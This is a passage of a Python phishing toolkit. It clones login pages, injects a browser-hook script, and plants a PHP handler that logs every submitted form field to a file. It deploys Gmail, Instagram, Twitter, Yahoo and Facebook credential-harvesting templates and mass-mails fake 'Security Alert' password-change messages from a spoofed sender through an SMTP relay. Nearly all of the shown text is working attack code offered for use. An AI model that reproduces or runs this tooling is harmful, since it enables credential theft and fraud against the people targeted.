                'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + bslash1 + '" type=' + bslash1 + '"text/javascript' + bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
                shell=True)
            subprocess.call(
                'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
                shell=True)
            subprocess.call(
                'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html',
                shell=True)
            subprocess.call(
                'mv /var/www/html/index.html /var/www/html/index.php',
                shell=True)
            subprocess.call(
                "sed -i \"1s#.*#<?php\\nif (\$_SERVER['REQUEST_METHOD'] == 'POST') {\\nheader('Location: " + URL_CLONE + "');\\n\$handle = fopen('log.txt', 'a');\\nfwrite(\$handle, '---['.\$_SERVER['SERVER_NAME'].\$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date(" + slashkutat + "h:i:s a - Y/m/d" + slashkutat + ")).']---['.\$_SERVER['REMOTE_ADDR']." + slashkutat + "]" + bslash1 + "\\\\\\r\\\\\\n" + slashkutat + ");\\nforeach(\$_POST as \$variable => \$value) {\\nfwrite(\$handle, \$variable.': '.\$value." + slashkutat + "\\\\\\r\\\\\\n" + slashkutat + ");}\\nfclose(\$handle);\\nexit;\\n} ?>#\" /var/www/html/index.php",
                shell=True)
            subprocess.call(
                'sed -i \'s#action="[^"]*"#action="<?php echo basename(__FILE__); ?>"#g\' /var/www/html/index.php',
                shell=True)
            HTML = """<div style="margin:0;padding:0" dir="ltr" bgcolor="#ffffff"><table cellspacing="0" 
                                    cellpadding="0" width="100%;" id="m_-7319109037895721555email_table" border="0" 
                                    style="border-collapse:collapse"><tbody><tr><td id="m_-7319109037895721555email_content" 
                                    style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial, 
                                    sans-serif;background:#ffffff"><table cellspacing="0" cellpadding="0" width="100%" 
                                    style="border-collapse:collapse"><tbody><tr><td height="20" style="line-height:20px" 
                                    colspan="3">&nbsp;</td></tr><tr><td height="1" colspan="3" 
                                    style="line-height:1px"></td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" 
                                    style="border-collapse:collapse;border:solid 1px white;margin:0 auto 5px auto;padding:3px 
                                    0;text-align:center;width:430px"><tbody><tr><td width="15px" style="width:15px"></td><td 
                                    style="line-height:0px;width:400px;padding:0 0 15px 0"><table cellspacing="0" cellpadding="0" 
                                    style="border-collapse:collapse"><tbody><tr><td 
                                    style="width:100%;text-align:left;height:33px"><img height="33" 
                                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn 
                                    :ANd9GcRTAX9wYDzmmVnzNYftpA06asyIoO8OkpCnw9IbEE9wLx_Lg5N4OA" style="border:0" 
                                    class="CToWUd"></td></tr></tbody></table></td><td width="15px" 
                                    style="width:15px"></td></tr><tr><td width="15px" style="width:15px"></td><td 
                                    style="border-top:solid 1px #c8c8c8"></td><td width="15px" 
                                    style="width:15px"></td></tr></tbody></table></td></tr><tr><td><table cellspacing="0" 
                                    cellpadding="0" width="430" style="border-collapse:collapse;margin:0 auto 0 
                                    auto"><tbody><tr><td><table cellspacing="0" cellpadding="0" width="430px" 
                                    style="border-collapse:collapse;margin:0 auto 0 auto;width:430px"><tbody><tr><td width="15" 
                                    style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td><table cellspacing="0" 
                                    cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td><table 
                                    cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td width="20" 
                                    style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" 
                                    cellpadding="0" style="border-collapse:collapse"><tbody><tr><td><p 
                                    style="padding:0;margin:10px 0 10px 0;color:#565a5c;font-size:18px">Hi {0}, 
                                    </p><p style="padding:0;margin:10px 0 10px 0;color:#565a5c;font-size:18px"><span>Change the 
                                    password because of the length of time you use your password for more 
                                    security</span><span>.</span></p><p style="padding:0;margin:10px 0 10px 
                                    0;color:#565a5c;font-size:18px">If this was you, please use the following to log in:</p><p 
                                    style="padding:0;margin:10px 0 10px 0;color:#565a5c;font-size:18px"><font size="6">Security 
                                    Alert!</font></p><p style="padding:0;margin:10px 0 10px 0;color:#565a5c;font-size:18px">If 
                                    this wasn't you, please <a href="{1}" style="color:#3b5998;text-decoration:none" 
                                    target="_blank">change your password</a> to secure your 
                                    account.</p></td></tr></tbody></table></td><td width="20" 
                                    style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td></tr></tbody></table></td></tr 
                                    ></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr><tr><td><table 
                                    cellspacing="0" cellpadding="0" width="430px" style="border-collapse:collapse;margin:0 auto 0 
                                    auto;width:430px"><tbody><tr><td height="30" style="line-height:30px" 
                                    colspan="3">&nbsp;</td></tr><tr><td width="20" 
                                    style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td><div 
                                    style="color:#abadae;font-size:12px;margin:0 auto 5px auto">© Company, Way, Menlo Park, 
                                    CA 94022</div><div style="color:#abadae;font-size:12px;margin:0 auto 5px auto">This message 
                                    was sent to <a style="color:#abadae;text-decoration:underline">{2}</a> and intended for 
                                    Member. Not your account? <a href="" style="color:#abadae;text-decoration:underline" 
                                    target="_blank">Remove your email</a> from this account.<br></div></td><td width="20" 
                                    style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td></tr></tbody></table></td></tr><tr 
                                    ><td height="20" style="line-height:20px" 
                                    colspan="3">&nbsp;</td></tr></tbody></table><span><img 
                                    src="https://ci6.googleusercontent.com/proxy/f8TdjWWQZLbPuhgu8Gz1qsup6 
                                    -I9BGWATWktPEUEU4u3RYuDO6deCw2HefCgsGg7hPSe_o7aRGaEmT5eWgbbwrXbav3ivvIxslWLXecN82F4_4M8H7SteqmpOyGarWOjk28YfUHllow0QTWrPMq2HuYbfF5Q4TRWM3y3=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=HMjU0MTE4NTg0OmFwaXpwdWRpbjk2QGdtYWlsLmNvbToxNTg3" style="border:0;width:1px;height:1px" class="CToWUd"></span></td></tr></tbody></table></div>""".format(
                TARGET_MAIL, URL, TARGET_MAIL)
            if METD_ATTACK == "1":
                msg = MIMEMultipart('mixed')
                msg['Subject'] = SUBJECT_MAIL
                msg['From'] = SPOOF_MAIL
                msg['To'] = TARGET_MAIL
                text_message = MIMEText('Timeout Account', 'plain')
                html_message = MIMEText(HTML, 'html')
                msg.attach(text_message)
                msg.attach(html_message)
                mailServer = smtplib.SMTP('mail.smtp2go.com', 2525)
                mailServer.ehlo()
                mailServer.starttls()
                mailServer.ehlo()
                mailServer.login(SMTP2GO_USER, SMTP2GO_PASS)
                mailServer.sendmail(SPOOF_MAIL, TARGET_MAIL, msg.as_string())
                mailServer.close()
                print "\t[i] Send Mail: {0}".format(TARGET_MAIL)

            elif METD_ATTACK == "2":
                f = open(TARGET_LIST, "r")
                line = f.readline()
                while line:
                    time.sleep(5.0)
                    line = f.readline()
                    msg = MIMEMultipart('mixed')
                    msg['Subject'] = SUBJECT_MAIL
                    msg['From'] = SPOOF_MAIL
                    msg['To'] = TARGET_MAIL
                    text_message = MIMEText('Timeout Account', 'plain')
                    html_message = MIMEText(HTML, 'html')
                    msg.attach(text_message)
                    msg.attach(html_message)
                    mailServer = smtplib.SMTP('mail.smtp2go.com', 2525)
                    mailServer.ehlo()
                    mailServer.starttls()
                    mailServer.ehlo()
                    mailServer.login(SMTP2GO_USER, SMTP2GO_PASS)
                    mailServer.sendmail(SPOOF_MAIL, line, msg.as_string())
                    mailServer.close()
                    print "\t[i] Send Mail: {0}".format(line)
                sys.exit()

        elif METD_MailPhish == "2":
            MailPhish = raw_input("\n\t[1] Gmail"
                                  "\n\t[2] Instagram"
                                  "\n\t[3] Twitter"
                                  "\n\t[4] Yahoo"
                                  "\n\t[5] Facebook"
                                  "\n\nroot@unk9vvn:~# ")
            if MailPhish == "1":
                TAMPLE_WEB = template + 'gmail/gmail_web.html'
                TAMPLE_POST = template + 'gmail/gmail_post.php'
                TAMPLE_MAIL = template + 'gmail/gmail_mail.html'
                subprocess.call(
                    'cp ' + TAMPLE_WEB + ' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_POST + ' /var/www/html/post.php',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_MAIL + ' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IiIIiI#' + usermail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiIIiII#' + emailmail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiII#' + URL + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#iLHOSTi#' + LHOST + '#g\' /var/www/html/index.html',
                    shell=True)
            elif MailPhish == "2":
                TAMPLE_WEB = template + 'instagram/instagram_web.html'
                TAMPLE_POST = template + 'instagram/instagram_post.php'
                TAMPLE_MAIL = template + 'instagram/instagram_mail.html'
                subprocess.call(
                    'cp ' + TAMPLE_WEB + ' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_POST + ' /var/www/html/post.php',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_MAIL + ' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IiIIiI#' + usermail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiIIiII#' + emailmail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#iIiIiIi#' + usermail + '#g\' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiII#' + URL + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#iLHOSTi#' + LHOST + '#g\' /var/www/html/index.html',
                    shell=True)
            elif MailPhish == "3":
                TAMPLE_WEB = template + 'twitter/twitter_web.html'
                TAMPLE_POST = template + 'twitter/twitter_post.php'
                TAMPLE_MAIL = template + 'twitter/twitter_mail.html'
                subprocess.call(
                    'cp ' + TAMPLE_WEB + ' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_POST + ' /var/www/html/post.php',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_MAIL + ' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IiIIiI#' + usermail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiIIiII#' + emailmail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiII#' + URL + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#iLHOSTi#' + LHOST + '#g\' /var/www/html/index.html',
                    shell=True)
            elif MailPhish == "4":
                TAMPLE_WEB = template + 'yahoo/yahoo_web.html'
                TAMPLE_POST = template + 'yahoo/yahoo_post.php'
                TAMPLE_MAIL = template + 'yahoo/yahoo_mail.html'
                subprocess.call(
                    'cp ' + TAMPLE_WEB + ' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_POST + ' /var/www/html/post.php',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_MAIL + ' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IiIIiI#' + usermail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiII#' + URL + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IiIIiI#' + usermail + '#g\' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#iLHOSTi#' + LHOST + '#g\' /var/www/html/index.html',
                    shell=True)
            elif MailPhish == "5":
                TAMPLE_WEB = template + 'facebook/facebook_web.html'
                TAMPLE_POST = template + 'facebook/facebook_post.php'
                TAMPLE_MAIL = template + 'facebook/facebook_mail.html'
                subprocess.call(
                    'cp ' + TAMPLE_WEB + ' /var/www/html/index.html',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_POST + ' /var/www/html/post.php',
                    shell=True)
                subprocess.call(
                    'cp ' + TAMPLE_MAIL + ' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IiIIiI#' + usermail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiIIiII#' + emailmail + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#IIiII#' + URL + '#g\' /var/www/html/mail.html',
                    shell=True)
                subprocess.call(
                    'sed -i -e \'s#iLHOSTi#' + LHOST + '#g\' /var/www/html/index.html',
                    shell=True)
            else:
                return MailPhish
            MAIL_HTML = '/var/www/html/mail.html'
            fg = open(MAIL_HTML, "r")
            HTML_MAIL = fg.readlines()
            if METD_ATTACK == "1":
                msg = MIMEMultipart('mixed')
                msg['Subject'] = SUBJECT_MAIL
                msg['From'] = SPOOF_MAIL
                msg['To'] = TARGET_MAIL
                text_message = MIMEText('Timeout Account', 'plain')
                html_message = MIMEText(HTML_MAIL, 'html')
                msg.attach(text_message)
                msg.attach(html_message)
                mailServer = smtplib.SMTP('mail.smtp2go.com', 2525)
                mailServer.ehlo()
                mailServer.starttls()
                mailServer.ehlo()
                mailServer.login(SMTP2GO_USER, SMTP2GO_PASS)
                mailServer.sendmail(SPOOF_MAIL, TARGET_MAIL, msg.as_string())
                mailServer.close()
                print "\t[i] Send Mail: {0}".format(TARGET_MAIL)
            elif METD_ATTACK == "2":
                f = open(TARGET_LIST, "r")
                line = f.readline()
                while line:
                    time.sleep(5.0)
                    line = f.readline()
                    msg = MIMEMultipart('mixed')
                    msg['Subject'] = SUBJECT_MAIL
                    msg['From'] = SPOOF_MAIL
                    msg['To'] = TARGET_MAIL
                    text_message = MIMEText('Timeout Account', 'plain')
                    html_message = MIMEText(HTML_MAIL, 'html')
                    msg.attach(text_message)
                    msg.attach(html_message)
                    mailServer = smtplib.SMTP('mail.smtp2go.com', 2525)
                    mailServer.ehlo()
                    mailServer.starttls()
                    mailServer.ehlo()
                    mailServer.login(SMTP2GO_USER, SMTP2GO_PASS)
                    mailServer.sendmail(SPOOF_MAIL, line, msg.as_string())
                    mailServer.close()
                    print "\t[i] Send Mail: {0}".format(line)
                print """
             _   _             _       _____                      _      _
        /\  | | | |           | |     / ____|                    | |    | |
       /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___
      / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
     / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
    /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
                                                               | |
                                                               |_|
"""
                sys.exit()
            else:
                return METD_MailPhish
        else:
            return NGROK_SLT
    else:
        sys.exit()
